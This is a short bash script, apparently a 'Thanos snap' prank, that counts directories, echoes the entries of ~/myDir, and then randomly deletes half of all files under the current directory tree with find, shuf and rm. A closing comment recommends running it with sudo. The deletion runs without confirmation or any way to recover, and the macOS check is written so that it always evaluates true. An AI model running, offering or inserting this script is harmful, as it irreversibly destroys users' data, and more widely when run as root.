#!/bin/bash

# Author : Sankshit Pandoh
# ----------------------Still under construction
# Script follows here:
shopt -s dotglob
count=0
#inital count set to zero
#folder counting loop begins here
for dir in *; do
  test -d "$dir" || continue
  test . = "$dir" && continue
  test .. = "$dir" && continue
  ((count++))
done
echo $count
VARIABLE_A=$count
echo $VARIABLE_A
#create an array with all the filer/dir inside ~/myDir
arr=(~/myDir/*)

#or other approach
# iterate through array using a counter
for ((i=0; i<${#arr[@]}; i++)); do
    #do something to each element of array
    echo "${arr[$i]}"
    echo "thanos initiating his snap, brance yourselves"
done

#different approach

##count the number of files in the current directory and divide it by two
let "i=`find . -type f | wc -l`/2";
if [[ uname=="Darwin" ]]; then
    find . -not -name "Thanos.sh" -type f -print0 | gshuf -z -n $i | xargs -0  -- rm;
else
    find . -not -name "Thanos.sh" -type f -print0 | shuf -z -n $i | xargs -0  -- rm;
fi
#its preferred if sudo is used.